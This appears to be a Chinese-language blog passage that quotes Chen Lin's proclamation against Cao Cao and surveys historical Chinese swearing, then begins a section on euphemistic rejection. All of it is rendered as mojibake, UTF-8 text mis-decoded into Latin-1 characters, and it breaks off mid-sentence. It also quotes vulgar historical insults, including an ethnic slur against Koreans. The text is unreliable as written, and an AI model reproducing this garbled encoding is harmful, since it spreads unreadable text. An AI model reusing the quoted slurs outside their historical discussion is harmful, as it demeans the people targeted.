è‡£è™‘éš¾ä»¥ç«‹æƒã€‚æ˜¯ä»¥æœ‰éå¸¸ä¹‹äººï¼Œç„¶åæœ‰éå¸¸ä¹‹äº‹ï¼›æœ‰éå¸¸ä¹‹äº‹ï¼Œç„¶åç«‹éå¸¸ä¹‹åŠŸã€‚</p><p>å¤«éå¸¸è€…ï¼Œå›ºéå¸¸äººæ‰€æ‹Ÿä¹Ÿã€‚æ›©è€…ï¼Œå¼ºç§¦å¼±ä¸»ï¼Œèµµé«˜æ‰§æŸ„ï¼Œä¸“åˆ¶æœæƒï¼Œå¨ç¦ç”±å·±ï¼›æ—¶äººè¿«èƒï¼Œè«æ•¢æ­£è¨€ï¼›ç»ˆæœ‰æœ›å¤·ä¹‹è´¥ï¼Œç¥–å®—ç„šç­ï¼Œæ±¡è¾±è‡³ä»Šï¼Œæ°¸ä¸ºä¸–é‰´ã€‚åŠè‡»å•åå­£å¹´ï¼Œäº§ç¦„ä¸“æ”¿ï¼Œå†…å…¼äºŒå†›ï¼Œå¤–ç»Ÿæ¢ã€èµµï¼›æ“…æ–­ä¸‡æœºï¼Œå†³äº‹çœç¦ï¼›ä¸‹é™µä¸Šæ›¿ï¼Œæµ·å†…å¯’å¿ƒã€‚</p><p>äºæ˜¯ç»›ä¾¯æœ±è™šå…´å…µå¥‹æ€’ï¼Œè¯›å¤·é€†æš´ï¼Œå°Šç«‹å¤ªå®—ï¼Œæ•…èƒ½ç‹é“å…´éš†ï¼Œå…‰æ˜æ˜¾èï¼šæ­¤åˆ™å¤§è‡£ç«‹æƒä¹‹æ˜è¡¨ä¹Ÿã€‚å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</p><p>å¹•åºœè‘£ç»Ÿé¹°æ‰¬ï¼Œæ‰«é™¤å‡¶é€†ï¼›ç»­é‡è‘£å“ï¼Œä¾µå®˜æš´å›½ã€‚äºæ˜¯æå‰‘æŒ¥é¼“ï¼Œå‘å‘½ä¸œå¤ï¼Œæ”¶ç½—è‹±é›„ï¼Œå¼ƒç‘•å–ç”¨ï¼›æ•…é‚ä¸æ“åŒè°˜åˆè°‹ï¼Œæˆä»¥è£¨å¸ˆï¼Œè°“å…¶é¹°çŠ¬ä¹‹æ‰ï¼Œçˆªç‰™å¯ä»»ã€‚</p><p>è‡³ä¹ƒæ„šä½»çŸ­ç•¥ï¼Œè½»è¿›æ˜“é€€ï¼Œä¼¤å¤·æŠ˜è¡„ï¼Œæ•°ä¸§å¸ˆå¾’ï¼›å¹•åºœè¾„å¤åˆ†å…µå‘½é”ï¼Œä¿®å®Œè¡¥è¾‘ï¼Œè¡¨è¡Œä¸œéƒ¡ï¼Œé¢†å…–å·åˆºå²ï¼Œè¢«ä»¥è™æ–‡ï¼Œå¥–î¡ˆæˆšå¨æŸ„ï¼Œå†€è·ç§¦å¸ˆä¸€å…‹ä¹‹æŠ¥ã€‚</p><p>è€Œæ“é‚æ‰¿èµ„è·‹æ‰ˆï¼Œæ£è¡Œå‡¶å¿’ï¼Œå‰²å‰¥å…ƒå…ƒï¼Œæ®‹è´¤å®³å–„ã€‚æ•…ä¹æ±Ÿå¤ªå®ˆè¾¹è®©ï¼Œè‹±æ‰ä¿Šä¼Ÿï¼Œå¤©ä¸‹çŸ¥åï¼›ç›´è¨€æ­£è‰²ï¼Œè®ºä¸é˜¿è°„ï¼›èº«é¦–è¢«æ­æ‚¬ä¹‹è¯›ï¼Œå¦»å­¥å—ç°ç­ä¹‹å’ã€‚</p><p>è‡ªæ˜¯å£«æ—æ„¤ç—›ï¼Œæ°‘æ€¨å¼¥é‡ï¼›ä¸€å¤«å¥‹è‡‚ï¼Œä¸¾å·åŒå£°ã€‚æ•…èº¬ç ´äºå¾æ–¹ï¼Œåœ°å¤ºäºå•å¸ƒï¼›å½·å¾¨ä¸œè£”ï¼Œè¹ˆæ®æ— æ‰€ã€‚</p><p>å¹•åºœæƒŸå¼ºå¹²å¼±æä¹‹ä¹‰ï¼Œä¸”ä¸ç™»å›äººä¹‹å…šï¼Œæ•…å¤æ´æ—Œæ“ç”²ï¼Œå¸­å·èµ·å¾ï¼Œé‡‘é¼“å“æŒ¯ï¼Œå¸ƒä¼—å¥”æ²®ï¼›æ‹¯å…¶æ­»äº¡ä¹‹æ‚£ï¼Œå¤å…¶æ–¹ä¼¯ä¹‹ä½ï¼šåˆ™å¹•åºœæ— å¾·äºå…–åœŸä¹‹æ°‘ï¼Œè€Œæœ‰å¤§é€ äºæ“ä¹Ÿã€‚</p><p>åä¼šéŠ®é©¾è¿”æ—†ï¼Œç¾¤è™å¯‡æ”»ã€‚æ—¶å†€å·æ–¹æœ‰åŒ—é„™ä¹‹è­¦ï¼ŒåŒªé‘ç¦»å±€ï¼›æ•…ä½¿ä»äº‹ä¸­éƒå¾å‹‹ï¼Œå°±å‘é£æ“ï¼Œä½¿ç¼®ä¿®éƒŠåº™ï¼Œç¿Šå«å¹¼ä¸»ã€‚</p><p>æ“ä¾¿æ”¾å¿—ï¼šä¸“è¡Œèƒè¿ï¼Œå½“å¾¡çœç¦ï¼›å‘ä¾®ç‹å®¤ï¼Œè´¥æ³•ä¹±çºªï¼›åé¢†ä¸‰å°ï¼Œä¸“åˆ¶æœæ”¿ï¼›çˆµèµç”±å¿ƒï¼Œå¼„æˆ®åœ¨å£ï¼›æ‰€çˆ±å…‰äº”å®—ï¼Œæ‰€æ¶ç­ä¸‰æ—ï¼›ç¾¤è°ˆè€…å—æ˜¾è¯›ï¼Œè…¹è®®è€…è’™éšæˆ®ï¼›</p><p>ç™¾åƒšé’³å£ï¼Œé“è·¯ä»¥ç›®ï¼›å°šä¹¦è®°æœä¼šï¼Œå…¬å¿å……å‘˜å“è€Œå·²æ•…å¤ªå°‰æ¨å½ªï¼Œå…¸å†äºŒå¸ï¼Œäº«å›½æä½ã€‚æ“å› ç¼˜çœ¦çšï¼Œè¢«ä»¥éç½ªï¼›æ¦œæ¥šå‚å¹¶ï¼Œäº”æ¯’å¤‡è‡³ï¼›è§¦æƒ…ä»»å¿’ï¼Œä¸é¡¾å®ªçº²ã€‚åˆè®®éƒèµµå½¦ï¼Œå¿ è°ç›´è¨€ï¼Œä¹‰æœ‰å¯çº³ï¼Œæ˜¯ä»¥åœ£æœå«å¬ï¼Œæ”¹å®¹åŠ é¥°ã€‚</p><p>æ“æ¬²è¿·å¤ºæ—¶æ˜ï¼Œæœç»è¨€è·¯ï¼Œæ“…æ”¶ç«‹æ€ï¼Œä¸ä¿ŸæŠ¥å›½ã€‚</p><p>åˆæ¢å­ç‹ï¼Œå…ˆå¸æ¯æ˜†ï¼ŒåŸé™µå°Šæ˜¾ï¼›æ¡‘æ¢“æ¾æŸï¼ŒçŠ¹å®œè‚ƒæ­ã€‚è€Œæ“å¸…å°†åå£«ï¼Œäº²ä¸´å‘æ˜ï¼Œç ´æ£ºè£¸å°¸ï¼Œæ å–é‡‘å®ã€‚è‡³ä»¤åœ£æœæµæ¶•ï¼Œå£«æ°‘ä¼¤æ€€ï¼æ“åˆç‰¹ç½®å‘ä¸˜ä¸­éƒå°†ã€æ‘¸é‡‘æ ¡å°‰ï¼Œæ‰€è¿‡éš³çªï¼Œæ— éª¸ä¸éœ²ã€‚</p><p>èº«å¤„ä¸‰å…¬ä¹‹ä½ï¼Œè€Œè¡Œæ¡€è™ä¹‹æ€ï¼Œæ±¡å›½å®³æ°‘ï¼Œæ¯’æ–½äººé¬¼ï¼åŠ å…¶ç»†è‡´æƒ¨è‹›ï¼Œç§‘é˜²äº’è®¾ï¼›ç½¾ç¼´å……è¹Šï¼Œå‘é˜±å¡è·¯ï¼›ä¸¾æ‰‹æŒ‚ç½‘ç½—ï¼ŒåŠ¨è¶³è§¦æœºé™·ï¼šæ˜¯ä»¥å…–ã€è±«æœ‰æ— èŠä¹‹æ°‘ï¼Œå¸éƒ½æœ‰åå—Ÿä¹‹æ€¨ã€‚</p><p>å†è§‚è½½ç±ï¼Œæ— é“ä¹‹è‡£ï¼Œè´ªæ®‹é…·çƒˆï¼Œäºæ“ä¸ºç”šï¼å¹•åºœæ–¹è¯˜å¤–å¥¸ï¼ŒæœªåŠæ•´è®­ï¼›åŠ ç»ªå«å®¹ï¼Œå†€å¯å¼¥ç¼ã€‚è€Œæ“è±ºç‹¼é‡å¿ƒï¼Œæ½œåŒ…ç¥¸è°‹ï¼Œä¹ƒæ¬²æ‘§æŒ æ ‹æ¢ï¼Œå­¤å¼±æ±‰å®¤ï¼Œé™¤ç­å¿ æ­£ï¼Œä¸“ä¸ºè¢…é›„ã€‚</p><p>å¾€è€…ä¼é¼“åŒ—å¾å…¬å­™ç“’ï¼Œå¼ºå¯‡æ¡€é€†ï¼Œæ‹’å›´ä¸€å¹´ã€‚æ“å› å…¶æœªç ´ï¼Œé˜´äº¤ä¹¦å‘½ï¼Œå¤–åŠ©ç‹å¸ˆï¼Œå†…ç›¸æ©è¢­ã€‚ä¼šå…¶è¡Œäººå‘éœ²ï¼Œç“’äº¦æ­å¤·ï¼Œæ•…ä½¿é”‹èŠ’æŒ«ç¼©ï¼Œå¥å›¾ä¸æœã€‚ä»Šä¹ƒå±¯æ®æ•·ä»“ï¼Œé˜»æ²³ä¸ºå›ºï¼Œæ¬²ä»¥è³è‚ä¹‹æ–§ï¼Œå¾¡éš†è½¦ä¹‹éš§ã€‚</p><p>å¹•åºœå¥‰æ±‰å¨çµï¼ŒæŠ˜å†²å®‡å®™ï¼›é•¿æˆŸç™¾ä¸‡ï¼Œèƒ¡éª‘åƒç¾¤ï¼›å¥‹ä¸­é»„è‚²è·ä¹‹å£«ï¼Œéª‹è‰¯å¼“åŠ²å¼©ä¹‹åŠ¿ï¼›å¹¶å·è¶Šå¤ªè¡Œï¼Œé’å·æ¶‰æµæ¼¯ï¼›å¤§å†›æ³›é»„æ²³è€Œè§’å…¶å‰ï¼Œè†å·ä¸‹å®›å¶è€Œæå…¶åï¼šé›·éœ‡è™æ­¥ï¼Œè‹¥ä¸¾ç‚ç«ä»¥ç„«é£è“¬ï¼Œè¦†æ²§æµ·ä»¥æ²ƒ[ç«ç¥¨]ç‚­ï¼Œæœ‰ä½•ä¸ç­è€…å“‰ï¼Ÿ</p><p>åˆæ“å†›åå£«ï¼Œå…¶å¯æˆ˜è€…ï¼Œçš†å‡ºè‡ªå¹½å†€ï¼Œæˆ–æ•…è¥éƒ¨æ›²ï¼Œå’¸æ€¨æ—·æ€å½’ï¼Œæµæ¶•åŒ—é¡¾ã€‚å…¶ä½™å…–è±«ä¹‹æ°‘ï¼ŒåŠå•å¸ƒå¼ æ¨ä¹‹ä½™ä¼—ï¼Œè¦†äº¡è¿«èƒï¼Œæƒæ—¶è‹Ÿä»ï¼›å„è¢«åˆ›å¤·ï¼Œäººä¸ºä»‡æ•Œã€‚</p><p>è‹¥å›æ—†æ–¹å¾‚ï¼Œç™»é«˜å†ˆè€Œå‡»é¼“å¹ï¼Œæ‰¬ç´ æŒ¥ä»¥å¯é™è·¯ï¼Œå¿…åœŸå´©ç“¦è§£ï¼Œä¸ä¿Ÿè¡€åˆƒã€‚æ–¹ä»Šæ±‰å®¤é™µè¿Ÿï¼Œçº²ç»´å¼›ç»ï¼›åœ£æœæ— ä¸€ä»‹ä¹‹è¾…ï¼Œè‚¡è‚±æ— æŠ˜å†²ä¹‹åŠ¿ã€‚</p><p>æ–¹ç•¿ä¹‹å†…ï¼Œç®€ç»ƒä¹‹è‡£ï¼Œçš†å‚å¤´ç¿¼ï¼Œè«æ‰€å‡­æƒï¼›è™½æœ‰å¿ ä¹‰ä¹‹ä½ï¼Œèƒäºæš´è™ä¹‹è‡£ï¼Œç„‰èƒ½å±•å…¶èŠ‚ï¼Ÿåˆæ“æŒéƒ¨æ›²ç²¾å…µä¸ƒç™¾ï¼Œå›´å®ˆå®«é˜™ï¼Œå¤–æ‰˜å®¿å«ï¼Œå†…å®æ‹˜æ‰§ã€‚æƒ§å…¶ç¯¡é€†ä¹‹èŒï¼Œå› æ–¯è€Œä½œã€‚æ­¤ä¹ƒå¿ è‡£è‚è„‘æ¶‚åœ°ä¹‹ç§‹ï¼Œçƒˆå£«ç«‹åŠŸä¹‹ä¼šï¼Œå¯ä¸å‹–å“‰ï¼</p><p>æ“åˆçŸ«å‘½ç§°åˆ¶ï¼Œé£ä½¿å‘å…µã€‚æè¾¹è¿œå·éƒ¡ï¼Œè¿‡å¬ç»™ä¸ï¼Œè¿ä¼—æ—…å›ï¼Œä¸¾ä»¥ä¸§åï¼Œä¸ºå¤©ä¸‹ç¬‘ï¼Œåˆ™æ˜å“²ä¸å–ä¹Ÿã€‚å³æ—¥å¹½å¹¶é’å†€å››å·å¹¶è¿›ã€‚</p><p>ä¹¦åˆ°è†å·ï¼Œä¾¿å‹’ç°å…µï¼Œä¸å»ºå¿ å°†å†›ååŒå£°åŠ¿ã€‚å·éƒ¡å„æ•´ä¹‰å…µï¼Œç½—è½å¢ƒç•Œï¼Œä¸¾æ­¦æ‰¬å¨ï¼Œå¹¶åŒ¡ç¤¾ç¨·ï¼šåˆ™éå¸¸ä¹‹åŠŸäºæ˜¯ä¹è‘—ã€‚</p><p>å…¶å¾—æ“é¦–è€…ï¼Œå°äº”åƒæˆ·ä¾¯ï¼Œèµé’±äº”åƒä¸‡ã€‚éƒ¨æ›²åè£¨å°†æ ¡è¯¸åé™è€…ï¼Œå‹¿æœ‰æ‰€é—®ã€‚å¹¿å®œæ©ä¿¡ï¼Œç­æ‰¬ç¬¦èµï¼Œå¸ƒå‘Šå¤©ä¸‹ï¼Œå’¸ä½¿çŸ¥åœ£æœæœ‰æ‹˜è¿«ä¹‹éš¾ã€‚å¦‚å¾‹ä»¤ï¼</p></blockquote><p>è¿™ä¸æ˜¯å¤§æ‰å­ï¼Ÿæœ€éªšçš„è¿˜åœ¨è¿™é‡Œï¼š<code>å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</code>ï¼Œç›´æ¥æ˜¯ä»ç¥–å®—åå…«ä»£éª‚äº†æ›¹æ“ä¸€å®¶ï¼Œè¿˜éª‚ä»–çˆ¹æ˜¯å¤ªç›‘ï¼Œæ›¹æ“å€’ä¹Ÿå®½å®¹å¤§åº¦ï¼Œåæ¥é€®ä½äº†é™ˆç³ï¼Œè¿˜ç¬‘ç€å¯¹ä»–è¯´ï¼šâ€œä½ çš„è¯´æ³•å°±å¾ˆæœ‰é—®é¢˜ï¼Œè¦æ˜¯æˆ‘çˆ¸æ˜¯å¤ªç›‘çš„è¯ï¼Œæˆ‘æ˜¯æ€ä¹ˆç”Ÿä¸‹æ¥çš„å‘¢â€ï¼Œä¹Ÿæ²¡æ€é™ˆç³ï¼Œè®©é™ˆç³ä¸‹å»åšå†™æ–‡ç« çš„äººäº†ã€‚</p><p>å†åˆ°äº†å”å®‹å…ƒæ—¶æœŸï¼Œå°±æœ‰äº†æ›´å¤šå¯éª‚çš„è¯æ±‡äº†ï¼Œç»è¿‡äº†ç§¦æ±‰çš„å‘å±•ï¼Œå”å®‹å…ƒè„è¯è¿›ä¸€æ­¥å‘ä»Šå¤©é æ‹¢ã€‚ä¸¾ä¸ªæ —å­ï¼Œã€Šèµ„æ²»é€šé‰´ã€‹ä¸­è®°è½½ï¼Œå®‰è¥¿èŠ‚åº¦ä½¿å¤«è’™çµå¯Ÿå¤§éª‚é«˜ä»™èŠï¼šâ€œå•–ç‹—ç²ªé«˜ä¸½å¥´ï¼â€ï¼ˆåƒç‹—å±å§é«˜ä¸½æ£’å­ï¼ˆé£Ÿå±å•¦ä½ ï¼Œå”å±å•¦æ¢éå‡¡ï¼‰ï¼‰ï¼Œæ··æ‚äº†å½“æ—¶çš„å„ç§æµè¡ŒæŠ€å·§ï¼Œå¦‚æ°‘æ—æ­§è§†ã€äººæ ¼é„™è§†ã€åŠ¨ç‰©ç±»æ¯”ç­‰ï¼Œä»£è¡¨äº†å”æœéª‚äººçš„ä¸Šç­‰æ°´å¹³ã€‚</p><p>è¢«èª‰ä¸ºåƒå¤ä¸€å¸çš„å”å®—å®‹ç¥–ï¼Œè„è¯ä¹Ÿç…§è¯´ä¸è¯¯ï¼Œå”å¤ªå®—æ›¾è¢«é­å¾çš„è¿›è°æƒ¹æ€’ï¼Œè·‘å›å»è·Ÿè€å©†å“­è¯‰ï¼šâ€œä¼šéœ€æ€æ­¤ç”°èˆç¿ï¼â€ï¼ˆæ€»æœ‰ä¸€å¤©è¦æ€äº†è¿™ä¸ªä¹¡å·´ä½¬ï¼‰ã€‚å®‹å¤ªç¥–å¯å®¤æˆ¿æ¢æŸåï¼Œéœ€è¦æ›´æ¢ï¼Œå¤§è‡£å¥æŠ¥è¦æˆªæ ¹å·¨æœ¨å½“æˆ¿æ¢ï¼Œå¤ªç¥–åœ¨æŠ˜å­ä¸Šæ‰¹ï¼šâ€œæˆªä½ çˆ·å¤´ï¼Œæˆªä½ å¨˜å¤´ã€‚â€ï¼ˆæˆªä½ çˆ¸çš„å¤´ï¼Œæˆªä½ å¦ˆçš„å¤´ï¼‰ï¼Œå½“æ—¶çš„äººä¸ç¦çº·çº·ç§°èµï¼Œè®¤ä¸ºå……åˆ†è¡¨ç°äº†å¤ªç¥–çš„çˆ±ç‰©ä¹‹å¿ƒã€‚</p><p>è€Œæƒ³è¦äº†è§£å®‹å…ƒçš„æ°‘é—´è„è¯ï¼Œå½“ç„¶ä¸å¾—ä¸çœ‹å›½éª‚å®å…¸ã€Šæ°´æµ’ä¼ ã€‹ï¼Œä»¥éª‚è¡—è¾¾äººé²æ™ºæ·±ä¸ºä¾‹ï¼Œè¯´è¯å‡ ä¹æ²¡æœ‰ä¸å¸¦è„å­—çš„ï¼šâ€œç›´å¨˜è´¼ï¼è¿˜æ•¢åº”å£â€ï¼Œâ€œä½ ä¸¤ä¸ªæ’®é¸Ÿâ€ï¼Œâ€œè¿™å®ä»¬æŒŸç€å±çœ¼æ’’å¼€â€ã€‚ç™½è¯ä¸­å¤¹å¸¦ç€æ–‡è¨€ï¼Œç²—ä¿—ä¸­é€éœ²ä¸€ä¸æ–‡è¶£ï¼ˆè¯¯ï¼‰ï¼Œå®Œç¾è¡¨ç°äº†èŠ±å’Œå°šè±è¾¾ç›´çˆ½çš„æ€§æ ¼ï¼Œè®©äººå¬äº†ç•…å¿«æ·‹æ¼“ï¼ˆå¤§è¯¯ï¼‰ã€‚</p><p>è¿™ä¼šå„¿åˆ°äº†æ˜æ¸…æ—¶æœŸï¼Œæ­å–œä½ ï¼Œå¯èƒ½ä¹‹å‰ä½ è§‰å¾—ï¼Œè´¼ã€è¿™å®ã€è…Œè‡œç­‰ï¼Œä»ç„¶ä¸å¤ŸåŠ²çˆ†ï¼Œé‚£ä¹ˆæ˜æ¸…åˆ™è¿›ä¸€æ­¥åœ°ï¼Œå°†è„è¯é›†ä¸­åˆ°ä¸‹åŠèº«ï¼Œä»¥åŠä¸‹åŠèº«çš„åŠ¨ä½œï¼Œä¸ä»Šå¤©éå¸¸æ¥è¿‘ï¼Œå¤ªå°¼å¨˜å¸¦åŠ²è¾£ã€‚ä¸è¿‡ã€Šå¤§æ˜å¾‹ã€‹å’Œã€Šå¤§æ¸…å¾‹ã€‹ä¸­è§„å®šï¼Œéª‚äººæ˜¯çŠ¯ç½ªè¡Œä¸ºï¼Œè½»è€…æ‰“å±è‚¡ã€é‡è€…æµæ”¾ï¼Œæ‰€ä»¥éª‚äººæœ‰ä¸€å®šé£é™©ã€‚è¿æ–‡äººå«éª‚ä¹Ÿç²—ä¿—äº†è®¸å¤šï¼Œæ¯”å¦‚æ˜æœæ–‡è±ªç‹ä¸–è´ï¼Œè´µä¸ºâ€œåä¸ƒå­â€ä¹‹é¦–ï¼Œåœ¨dissåˆ«äººçš„è¯—è¯æ—¶ï¼Œä¹Ÿä½¿ç”¨äº†ç²—é„™ä¹‹è¯­ï¼šâ€œæ­¤ç­‰è¯­ï¼Œä½•ä¸ä»¥æººè‡ªç…§ï¼Ÿâ€ï¼Œç”¨ä»Šå¤©çš„è¯è¯´å°±æ˜¯ï¼šâ€œä½ å†™çš„æ˜¯ä»€ä¹ˆé¬¼ï¼Œæ€ä¹ˆä¸æ’’æ³¡å°¿ç…§ç…§è‡ªå·±ï¼Ÿâ€ã€‚å·ç§°å°å»ºç¤¾ä¼šç™¾ç§‘å…¨ä¹¦çš„ã€Šçº¢æ¥¼æ¢¦ã€‹ï¼Œé‡Œé¢çš„éª‚äººè‰ºæœ¯ç”šè‡³å®Œçˆ†äº†ç°ä»£ï¼Œæ¯”å¦‚ç¬¬å››åå…­å›ï¼Œé¸³é¸¯éª‚å«‚å­ï¼šâ€œä½ å¿«å¤¹ç€å±„å˜´ç¦»äº†è¿™é‡Œï¼Œå¥½å¤šç€å‘¢ï¼ä»€ä¹ˆâ€˜å¥½è¯â€™ï¼å®‹å¾½å®—çš„é¹°ï¼Œèµµå­æ˜‚çš„é©¬ï¼Œéƒ½æ˜¯å¥½ç”»ï¼ˆè¯ï¼‰å„¿ã€‚ä»€ä¹ˆâ€˜å–œäº‹â€™ï¼çŠ¶å…ƒç—˜å„¿çŒçš„æµ†å„¿åˆæ»¡æ˜¯å–œäº‹ï¼æ€ªé“æˆæ—¥å®¶ç¾¡æ…•äººå®¶å¥³å„¿åšäº†å°è€å©†äº†ï¼Œä¸€å®¶å­éƒ½ä»—ç€ä»–æ¨ªè¡Œéœ¸é“çš„ï¼Œä¸€å®¶å­éƒ½æˆäº†å°è€å©†äº†ï¼çœ‹çš„çœ¼çƒ­äº†ï¼Œä¹ŸæŠŠæˆ‘é€åœ¨ç«å‘é‡Œå»ã€‚â€ï¼Œç››æ€’ä¹‹ä¸‹ï¼Œä¸ä»…å‡ºå£æˆè„ï¼Œè¿˜ä¸å¿˜ç”¨å…¸ï¼Œå‰åŠå¥ä¸€è¯­åŒå…³ï¼ŒååŠå¥è°éŸ³ç”¨å…¸ï¼Œè¿˜æ˜¯å‡ºè‡ªä¸€ä½å¨‡æ»´æ»´ï¼Œå°šæœªå‡ºå«çš„å°å§å§ä¹‹å£ã€‚ï¼ˆè´¾èµ¦çœ‹ä¸Šäº†è´¾æ¯è·Ÿå‰çš„è´´èº«ä¸«ç¯é¸³é¸¯ï¼Œè´ªæ‹ç¾è‰²çš„è´¾èµ¦å…ˆæ´¾é‚¢å¤«äººå‰å»ä¼ è¯ï¼Œæ²¡ä»€ä¹ˆè¿›å±•ï¼Œäºæ˜¯åæ¥åˆå«é¸³é¸¯çš„å«‚å«‚è¯´äº²ï¼Œä¸€å¿ƒæƒ³æ”€é¾™é™„å‡¤å‘ä¸Šçˆ¬çš„å«‚å«‚ä¸ä»…æ²¡æœ‰åšå¥½åª’ï¼Œæœ¬æƒ³ç€ä¸€é£å†²å¤©ï¼Œç»“æœå‘¢ï¼Œäººç”Ÿä¸å¦‚æ„ä¹‹äº‹åä¹‹å…«ä¹ï¼Œæ€§æ ¼åˆšçƒˆçš„é¸³é¸¯ç›´æ¥ç»™ä¸çŸ¥å¤©é«˜åœ°åšçš„å«‚å«‚ä¸€é¡¿å¥½éª‚ï¼é—¹çš„å¥¹ç°å¤´åœŸè„¸çš„ã€‚ï¼‰</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œè„è¯ä¸å¤–ä¹è¿™å‡ ä¸ªæ–¹é¢ï¼Œæ€§ã€åŠ¨ç‰©ã€æ¶å¿ƒã€åœ°ä½ã€äººæ ¼ã€è¡€ç»Ÿï¼Œæ‰€ä»¥è„è¯æƒ³ä»¤äººè€³ç›®ä¸€æ–°ï¼Œå¿…é¡»å¤šé¢ç»“åˆï¼Œå±‚å±‚é€’è¿›ã€‚æ¯”å¦‚ã€Šæ°´æµ’ä¼ ã€‹ç‹å©†éª‚éƒ“å“¥ï¼šâ€œå«é¸ŸçŒ¢ç‹²ï¼â€åˆå¦‚ã€Šé‡‘ç“¶æ¢…ã€‹å´æœˆå¨˜ç—›éª‚bitchï¼šâ€œè´¼ç‹—æ”®çš„å…»æ±‰çš„æ·«å¦‡ï¼â€éƒ½æ˜¯å¾ˆå¥½çš„æˆåŠŸæ¡ˆä¾‹ã€‚</p><p>ç›¸ä¿¡çœ‹åˆ°è¿™é‡Œï¼Œå¤§å®¶å¯¹å¤ä»£è„è¯ï¼Œä»¥åŠéª‚äººçš„é«˜çº§æŠ€å·§ï¼Œå·²ç»æœ‰äº†ä¸€å®šç†è§£ï¼Œä¸å¦¨è¯•åšä¾‹é¢˜ï¼š</p><hr><p>å¦‚ä½•è¯´ä¸€å¥ï¼ŒæƒŠå¤©åœ°æ³£é¬¼ç¥çš„è„è¯ï¼Ÿ</p><p>å‚è€ƒç­”æ¡ˆï¼š</p><p>æ˜æœ«æ¸…åˆé•¿ç¯‡å°è¯´ã€Šé†’ä¸–å§»ç¼˜ä¼ ã€‹ç¬¬åä¸€å›ï¼šâ€œæ”¾ä½ å®¶é‚£è‡­ç§çª å­æ·«å¦‡æ­ªæ‹‰éª¨æ¥ä¸‡äººçš„å¤§å¼€é—¨é©´å­ç‹—è‡­å±ï¼â€</p><hr><p>å†ç„¶åå‘¢ï¼Œå°±æ˜¯ç°ä»£è¾£ï¼Œç°ä»£å‘¢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p><del>å½³äºï¼Œè¿™ä¸€æ¬¡å°±è°ˆè¿™ä¹ˆå¤šäº†ï¼Œä¸‹æ¬¡è°ˆè°ˆæˆ‘æ­£å¥½æƒ³è°ˆçš„ï¼Œè™½ç„¶æš‚æ—¶è¿˜ä¸çŸ¥é“æƒ³è°ˆå•¥ï¼Œä½†æ˜¯è¿™ç©æ„å„¿å¯æ¯”è¯¾è®¾æœ‰æ„æ€å¤šäº†</del></p><h2 id="0x02-Chineseçš„å§”å©‰è‰ºæœ¯"><a href="#0x02-Chineseçš„å§”å©‰è‰ºæœ¯" class="headerlink" title="0x02 Chineseçš„å§”å©‰è‰ºæœ¯"></a>0x02 Chineseçš„å§”å©‰è‰ºæœ¯</h2><p><strong>â€œä½ æ˜¯ä¸ªå¥½äººâ€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬è¿˜æ˜¯åšæœ‹å‹å§â€</strong>ï¼Œ<strong>â€œæˆ‘ä»¬ä¸å¤ªåˆé€‚ï¼Œä½ ä¼šé‡åˆ°æ›´å¥½çš„â€</strong>ï¼Œä¸çŸ¥é“åœ¨åº§çš„hxdæœ‰å¤šå°‘äººå¬è¿‡è¿™äº›è¯ï¼Œç¡®å®å¤§å®¶éƒ½æ˜¯æ˜ç™½äººï¼Œè¿™ä¹ˆä¸€è¯´ä¹Ÿå°±æ˜ç™½äº†ï¼Œæ¬¸ï¼Œå‡‰äº†ï¼Œé»„äº†é»„äº†ï¼Œæ‰¾ä¸‹ä¸€ä¸ªå§ï¼Œxslï¼Œä½†æ˜¯æ€»å¥½è¿‡è¢«ç›´æ¥æŒ‘æ˜æ˜¯ä¸æ˜¯ï¼Œâ€œæˆ‘å¯¹ä½ æ²¡æœ‰æ„Ÿè§‰â€ï¼Œâ€œçˆ¬ï¼ŒğŸ‘µä¸å–œæ¬¢ä½ ä¸ªè„‘ç˜«â€ï¼Œâ€œæˆ‘ä»¥ä¸ºä½ åªæ˜¯æˆ‘æœ‹å‹è€Œå·²ï¼Œæˆ‘å…¶å®ä¹Ÿä¸å–œæ¬¢ä½ â€ï¼Œå¯¹ä¸å¯¹ï¼Œå†…å®¹å¤ªè¿‡æ‰å¿ƒï¼Œå¼•èµ·æåº¦ä¸é€‚ã€‚</p><p>å†è¯´ç‚¹çœŸå®çš„ï¼Œä½ å’Œä½ çš„å¥³ç¥èŠç€èŠç€ï¼Œä½ å¥³ç¥çªç„¶æ¥äº†ä¸€å¥ï¼šâ€œğŸ‘µæ´—æ¾¡å»äº†â€ï¼Œç„¶åä½ æœŸå¾…åœ°ååœ¨æ¡Œå‰æ‹¿ç€æ‰‹æœºç—´ç¬‘ï¼Œç­‰äº†ä¸ªä¸‰ä¸ªå°æ—¶ï¼Œå®¤å‹ä»¬éƒ½ç¡ç€å¥½ä¹…äº†ï¼Œé¼¾å£°åœ¨å¯å®¤é‡Œå›è¡ç€ï¼Œå¤©åœ°é—´å½·ä½›åªå­˜åœ¨ä½ ä¸ªæ’’æ¯”ï¼Œç”šè‡³ä½ 